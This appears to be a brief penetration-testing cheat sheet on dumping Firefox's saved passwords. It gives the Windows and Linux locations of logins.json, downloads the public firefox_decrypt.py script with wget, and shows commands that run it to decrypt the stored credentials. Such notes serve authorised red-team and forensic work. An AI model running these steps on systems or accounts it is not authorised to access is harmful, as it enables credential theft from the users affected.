# Dump Stored Credentials
```bash
# Storage Location for profiles.ini - Windows
C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<randomname>.default-release\logins.json

# Storage Location for profiles.ini - Linux
/home/kali/.mozilla/firefox/<randomname>.default-esr/logins.json

# Decrypt with firefox_decrypt.py
wget "https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py"
# Default profiles.ini location
python firefox_decrypt.py
# Specify profiles.ini location
python firefox_decrypt.py /folder/containing/profiles.ini/
```

# References
[firefox_decrypt.py](https://github.com/unode/firefox_decrypt)